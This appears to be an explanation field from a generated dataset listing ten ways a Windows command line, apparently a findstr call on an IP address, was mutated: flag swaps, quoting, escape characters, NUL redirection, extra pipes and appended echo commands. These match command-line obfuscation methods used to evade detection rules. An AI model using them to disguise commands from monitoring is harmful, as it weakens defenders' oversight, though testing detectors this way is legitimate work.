explanation: Replaced '-' with '/' for flag substitution and added quotes for path normalization.
Used escape characters for dots in the IP address to test path normalization.
Added redirection to NUL to suppress output while preserving the original command structure.
Piped the output to another findstr command to test reordering and insertion techniques.
Appended a harmless echo command after the original command to test argument omission and reordering.
Used an escape character with a pipe to test safe command-line mutation techniques.
Used escape characters and redirection to test safe command-line mutation techniques.
Used redirection from NUL to test safe command-line mutation techniques.
Used redirection from and to NUL to test safe command-line mutation techniques.
Used a pipe and another findstr command to test safe command-line mutation techniques.
